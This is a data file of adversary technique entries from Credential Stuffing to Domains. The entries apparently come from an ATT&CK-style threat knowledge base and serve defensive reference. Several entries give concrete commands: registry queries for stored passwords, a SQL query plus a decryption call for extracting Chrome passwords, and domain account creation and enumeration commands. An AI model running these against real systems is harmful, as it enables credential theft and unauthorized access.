Credential Stuffing,"Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.Credential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.Typically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following:* SSH (22/TCP)* Telnet (23/TCP)* FTP (21/TCP)* NetBIOS / SMB / Samba (139/TCP & 445/TCP)* LDAP (389/TCP)* Kerberos (88/TCP)* RDP / Terminal Services (3389/TCP)* HTTP/HTTP Management Services (80/TCP & 443/TCP)* MSSQL (1433/TCP)* Oracle (1521/TCP)* MySQL (3306/TCP)* VNC (5900/TCP)In addition to management services, adversaries may ""target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,"" as well as externally facing email applications, such as Office 365.",technique
Credentials,"Before compromising a victim, adversaries may gather credentials that can be used during targeting. Account credentials gathered by adversaries may be those directly associated with the target victim organization or attempt to take advantage of the tendency for users to use the same passwords across personal and business accounts.Adversaries may gather credentials from potential victims in various ways, such as direct elicitation via . Adversaries may also compromise sites then include malicious content designed to collect website authentication cookies from visitors. Credential information may also be exposed to adversaries via leaks to online or other accessible data sets (ex: , breach dumps, code repositories, etc.). Adversaries may also purchase credentials from dark web or other black-markets. Gathering this information may reveal opportunities for other forms of reconnaissance (ex:  or ), establishing operational resources (ex: ), and/or initial access (ex:  or ).",technique
Credentials In Files,"Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.It is possible to extract passwords from backups or saved virtual machines through .  Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. In cloud environments, authenticated user credentials are often stored in local configuration and credential files. In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files. ",technique
Credentials from Password Stores,"Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications that store passwords to make it easier for users manage and maintain. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.",technique
Credentials from Web Browsers,"Adversaries may acquire credentials from web browsers by reading files specific to the target browser. Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.For example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, AppData\Local\Google\Chrome\User Data\Default\Login Data and executing a SQL query: SELECT action_url, username_value, password_value FROM logins;. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function CryptUnprotectData, which uses the victims cached logon credentials as the decryption key.  Adversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc. Adversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.After acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).",technique
Credentials in Registry,Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.Example commands to find Registry keys related to password information: * Local Machine Hive: reg query HKLM /f password /t REG_SZ /s* Current User Hive: reg query HKCU /f password /t REG_SZ /s,technique
Cron,Adversaries may abuse the cron utility to perform task scheduling for initial or recurring execution of malicious code. The cron utility is a time-based job scheduler for Unix-like operating systems.  The  crontab file contains the schedule of cron entries to be run and the specified times for execution. Any crontab files are stored in operating system-specific file paths.An adversary may use cron in Linux or Unix environments to execute programs at system startup or on a scheduled basis for persistence. cron can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.,technique
DCSync,"Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)    to simulate the replication process from a remote domain controller using a technique called DCSync.Members of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a  for use in  or change an account's password as noted in .DCSync functionality has been included in the ""lsadump"" module in . Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.",technique
DLL Search Order Hijacking,"Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program.  Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.There are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks,  by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. Adversaries may also directly modify the way a program loads DLLs by replacing an existing DLL or modifying a .manifest or .local redirection file, directory, or junction to cause the program to load a different DLL.   If a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program.Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",technique
DLL Side-Loading,"Adversaries may execute their own malicious payloads by hijacking the library manifest used to load DLLs. Adversaries may take advantage of vague references in the library manifest of a program by replacing a legitimate library with a malicious one, causing the operating system to load their malicious library when it is called for by the victim program.Programs may specify DLLs that are loaded at runtime. Programs that improperly or vaguely specify a required DLL may be open to a vulnerability in which an unintended DLL is loaded. Side-loading vulnerabilities specifically occur when Windows Side-by-Side (WinSxS) manifests  are not explicit enough about characteristics of the DLL to be loaded. Adversaries may take advantage of a legitimate program that is vulnerable by replacing the legitimate DLL with a malicious one.  Adversaries likely use this technique as a means of masking actions they perform under a legitimate, trusted system or software process.",technique
DNS,"Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. The DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ",technique
DNS,"Before compromising a victim, adversaries may gather information about the victim's DNS that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a targets subdomains, mail servers, and other hosts.Adversaries may gather this information in various ways, such as querying or otherwise collecting details via . DNS information may also be exposed to adversaries via online or other accessible data sets (ex: ). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: , , or ), establishing operational resources (ex:  or ), and/or initial access (ex: ).",technique
DNS Calculation,"Adversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address. A IP and/or port number calculation can be used to bypass egress filtering on a C2 channel.One implementation of  is to take the first three octets of an IP address in a DNS response and use those values to calculate the port for command and control traffic.",technique
DNS Server,"Before compromising a victim, adversaries may set up their own Domain Name System (DNS) servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: ). Instead of hijacking existing DNS servers, adversaries may opt to configure and run their own DNS servers in support of operations.By running their own DNS servers, adversaries can have more control over how they administer server-side DNS C2 traffic (). With control over a DNS server, adversaries can configure DNS applications to provide conditional responses to malware and, generally, have more flexibility in the structure of the DNS-based C2 channel.",technique
DNS Server,"Before compromising a victim, adversaries may compromise third-party DNS servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: ). Instead of setting up their own DNS servers, adversaries may compromise third-party DNS servers in support of operations.By compromising DNS servers, adversaries can alter DNS records. Such control can allow for redirection of an organization's traffic, facilitating Collection and Credential Access efforts for the adversary. Adversaries may also be able to silently create subdomains pointed at malicious servers without tipping off the actual owner of the DNS server.",technique
DNS/Passive DNS,"Before compromising a victim, adversaries may search DNS data for information about victims that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a targets subdomains, mail servers, and other hosts.Adversaries may search DNS data to gather actionable information. Threat actors can query nameservers for a target organization directly, or search through centralized repositories of logged DNS query responses (known as passive DNS). Adversaries may also seek and target DNS misconfigurations/leaks that reveal information about internal networks. Information from these sources may reveal opportunities for other forms of reconnaissance (ex:  or ), establishing operational resources (ex:  or ), and/or initial access (ex:  or ).",technique
Data Destruction,"Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives. Common operating system file deletion commands such as del and rm often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from  and  because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.Adversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable. In some cases politically oriented image files have been used to overwrite data.To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like , , and .",technique
Data Encoding,"Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.  Some data encoding systems may also result in data compression, such as gzip.",technique
Data Encrypted for Impact,"Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted. In the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.To maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like , , and .",technique
Data Manipulation,"Adversaries may insert, delete, or manipulate data in order to manipulate external outcomes or hide activity. By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",technique
Data Obfuscation,"Adversaries may obfuscate command and control traffic to make it more difficult to detect. Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols. ",technique
Data Staged,"Adversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as . Interactive command shells may be used, and common functionality within  and bash may be used to copy data into a staging location.In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may  and stage data in that instance.Adversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection.",technique
Data Transfer Size Limits,An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.,technique
Data from Cloud Storage Object,"Adversaries may access data objects from improperly secured cloud storage.Many cloud service providers offer solutions for online data storage such as Amazon S3, Azure Storage, and Google Cloud Storage. These solutions differ from other storage solutions (such as SQL or Elasticsearch) in that there is no overarching application. Data from these solutions can be retrieved directly using the cloud provider's APIs. Solution providers typically offer security guides to help end users configure systems.Misconfiguration by end users is a common problem. There have been numerous incidents where cloud storage has been improperly secured (typically by unintentionally allowing public access by unauthenticated users or overly-broad access by all users), allowing open access to credit cards, personally identifiable information, medical records, and other sensitive information. Adversaries may also obtain leaked credentials in source repositories, logs, or other means as a way to gain access to cloud storage objects that have access permission controls.",technique
Data from Configuration Repository,"Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.Adversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.",technique
Data from Information Repositories,"Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information.The following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:* Policies, procedures, and standards* Physical / logical network diagrams* System architecture diagrams* Technical system documentation* Testing / development credentials* Work / project schedules* Source code snippets* Links to network shares and other internal resourcesInformation stored in a repository may vary based on the specific instance or environment. Specific common information repositories include , , and enterprise databases such as SQL Server.",technique
Data from Local System,"Adversaries may search local system sources, such as file systems or local databases, to find files of interest and sensitive data prior to Exfiltration.Adversaries may do this using a , such as , which has functionality to interact with the file system to gather information. Some adversaries may also use  on the local system.",technique
Data from Network Shared Drive,"Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within  may be used to gather information.",technique
Data from Removable Media,"Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within  may be used to gather information. Some adversaries may also use  on removable media.",technique
Dead Drop Resolver,"Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.Use of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",technique
Defacement,"Adversaries may modify visual content available internally or externally to an enterprise network. Reasons for  include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion. Disturbing or offensive images may be used as a part of  in order to cause user discomfort, or to pressure compliance with accompanying messages. ",technique
Default Accounts,"Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems or default factory/provider set accounts on other types of systems, software, or devices.Default accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen  or credential materials to legitimately connect to remote environments via .",technique
Delete Cloud Instance,An adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence.  Deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable.An adversary may also  and later terminate the instance after achieving their objectives.,technique
Deobfuscate/Decode Files or Information,Adversaries may use  to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.One such example is use of  to decode a remote access tool portable executable file that has been hidden inside a certificate file.  Another example is using the Windows copy /b command to reassemble binary fragments into a malicious payload. Sometimes a user's action may be required to open it for deobfuscation or decryption as part of . The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. ,technique
Determine Physical Locations,"Before compromising a victim, adversaries may gather the victim's physical location(s) that can be used during targeting. Information about physical locations of a target organization may include a variety of details, including where key resources and infrastructure are housed. Physical locations may also indicate what legal jurisdiction and/or authorities the victim operates within.Adversaries may gather this information in various ways, such as direct elicitation via . Physical locations of a target organization may also be exposed to adversaries via online or other accessible data sets (ex:  or ). Gathering this information may reveal opportunities for other forms of reconnaissance (ex:  or ), establishing operational resources (ex:  or ), and/or initial access (ex:  or ).",technique
Develop Capabilities,"Before compromising a victim, adversaries may build capabilities that can be used during targeting. Rather than purchasing, freely downloading, or stealing capabilities, adversaries may develop their own capabilities in-house. This is the process of identifying development requirements and building solutions such as malware, exploits, and self-signed certificates. Adversaries may develop capabilities to support their operations throughout numerous phases of the adversary lifecycle.As with legitimate development efforts, different skill sets may be required for developing capabilities. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the capability.",technique
Digital Certificates,"Before compromising a victim, adversaries may create self-signed SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. In the case of self-signing, digital certificates will lack the element of trust associated with the signature of a third-party certificate authority (CA).Adversaries may create self-signed SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: ) or even enabling  if added to the root of trust (i.e. ).",technique
Digital Certificates,"Before compromising a victim, adversaries may buy and/or steal SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner.Adversaries may purchase or steal SSL/TLS certificates to further their operations, such as encrypting C2 traffic (ex: ) or even enabling  if the certificate is trusted or otherwise added to the root of trust (i.e. ). The purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal certificate materials directly from a compromised third-party, including from certificate authorities.Certificate authorities exist that allow adversaries to acquire SSL/TLS certificates, such as domain validation certificates, for free.Adversaries may register or hijack domains that they will later purchase an SSL/TLS certificate for.",technique
Digital Certificates,"Before compromising a victim, adversaries may search public digital certificate data for information about victims that can be used during targeting. Digital certificates are issued by a certificate authority (CA) in order to cryptographically verify the origin of signed content. These certificates, such as those used for encrypted web traffic (HTTPS SSL/TLS communications), contain information about the registered organization such as name and location.Adversaries may search digital certificate data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about certificates. Digital certificate data may also be available from artifacts signed by the organization (ex: certificates used from encrypted web traffic are served with content). Information from these sources may reveal opportunities for other forms of reconnaissance (ex:  or ), establishing operational resources (ex:  or ), and/or initial access (ex:  or ).",technique
Direct Network Flood,"Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target.  are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.Botnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.",technique
Direct Volume Access,"Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique bypasses Windows file access controls as well as file system monitoring tools. Utilities, such as NinjaCopy, exist to perform these actions in PowerShell. ",technique
Disable Cloud Logs,"An adversary may disable cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an attacker has sufficient permissions, they can disable logging to avoid detection of their activities. For example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.",technique
Disable Crypto Hardware,"Adversaries disable a network devices dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data.Many network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks. Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering. When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of , forcing the use of software to perform encryption on general processors. This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., ). ",technique
Disable Windows Event Logging,"Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more. This data is used by security tools and analysts to generate detections.Adversaries may targeting system-wide logging or just that of a particular application. By disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",technique
Disable or Modify Cloud Firewall,"Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in . Cloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary may introduce new firewall rules or policies to allow access into a victim cloud environment. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups to allow any TCP/IP connectivity.Modifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed.",technique
Disable or Modify System Firewall,"Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.Modifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. ",technique
Disable or Modify Tools,"Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security tools scanning or reporting information.",technique
Disk Content Wipe,"Adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.Adversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface. Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data. Adversaries have been observed leveraging third-party drivers like  to directly access disk content. This behavior is distinct from  because sections of the disk are erased instead of individual files.To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like , , and .",technique
Disk Structure Wipe,"Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. Adversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table. The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable.  may be performed in isolation, or along with  if all sectors of a disk are wiped.To maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like , , and .",technique
Disk Wipe,"Adversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and/or wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted.To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disks may have worm-like features to propagate across a network by leveraging additional techniques like , , and .",technique
Distributed Component Object Model,"Adversaries may use  to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.The Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.Permissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry. By default, only Administrators may remotely activate and launch COM objects through DCOM.Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications as well as other Windows objects that contain insecure methods. DCOM can also execute macros in existing documents and may also invoke Dynamic Data Exchange (DDE) execution directly through a COM created instance of a Microsoft Office application, bypassing the need for a malicious document.",technique
Domain Account,"Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the net user /add /domain command can be used to create a domain account.Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",technique
Domain Account,"Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior.Commands such as net user /domain and net group /domain of the  utility, dscacheutil -q groupon macOS, and ldapsearch on Linux can list domain users and groups.",technique
Domain Accounts,"Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.  Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.Adversaries may compromise domain accounts, some with a high level of privileges, through various means such as  or password reuse, allowing access to privileged resources of the domain.",technique
Domain Controller Authentication,"Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts. Malware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any users account and/or credentials (ex: ). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.",technique
Domain Fronting,"Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS.  Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, ""domainless"" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).For example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.",technique
Domain Generation Algorithms,"Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.DGAs can take the form of apparently random or gibberish strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.Adversaries may use DGAs for the purpose of . When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.",technique
Domain Groups,"Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.Commands such as net group /domain of the  utility,  dscacheutil -q group on macOS, and ldapsearch on Linux can list domain-level groups.",technique
Domain Properties,"Before compromising a victim, adversaries may gather information about the victim's network domain(s) that can be used during targeting. Information about domains and their properties may include a variety of details, including what domain(s) the victim owns as well as administrative data (ex: name, registrar, etc.) and more directly actionable information such as contacts (email addresses and phone numbers), business addresses, and name servers.Adversaries may gather this information in various ways, such as direct collection actions via  or . Information about victim domains and their properties may also be exposed to adversaries via online or other accessible data sets (ex: ). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: , , or ), establishing operational resources (ex:  or ), and/or initial access (ex: ).",technique
Domain Trust Discovery,"Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain. Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct , , and . Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP. The Windows utility  is known to be used by adversaries to enumerate domain trusts.",technique
Domains,"Before compromising a victim, adversaries may purchase domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.Adversaries can use purchased domains for a variety of purposes, including for , , and Command and Control. Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD). Typosquatting may be used to aid in delivery of payloads via . Adversaries can also use internationalized domain names (IDNs) to create visually similar lookalike domains for use in operations.Domain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.",technique
